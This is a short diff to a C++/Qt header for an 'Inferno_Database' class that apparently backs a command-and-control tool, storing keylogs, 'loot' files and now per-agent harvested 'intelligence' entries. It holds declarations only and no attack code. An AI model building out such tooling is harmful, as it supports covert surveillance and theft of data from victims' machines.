@@ -32,6 +32,15 @@ struct LootEntry {
     QString timestamp;
 };
 
+struct IntelEntry {
+    int id = 0;
+    QString agentUuid;
+    QString dataType;
+    QString value;
+    QString context;
+    QString timestamp;
+};
+
 class Inferno_Database : public QObject {
     Q_OBJECT
 
@@ -46,6 +55,11 @@ public:
     bool logTelemetry(const QString& uuid, const QString& type, const QString& data);
     bool logKeylog(const QString& uuid, const QString& data);
     bool logLoot(const QString& uuid, const QString& filename, const QString& fileType, const QByteArray& content);
+    
+    // Circle 6 - Intelligence Analysis Methods
+    bool logIntelligence(const QString& uuid, const QString& type, const QString& value, const QString& context);
+    QList<IntelEntry> getIntelligence(const QString& uuid, const QString& typeFilter = "ALL");
+    bool clearIntelligence(const QString& uuid);
     
     // Retrieval
 
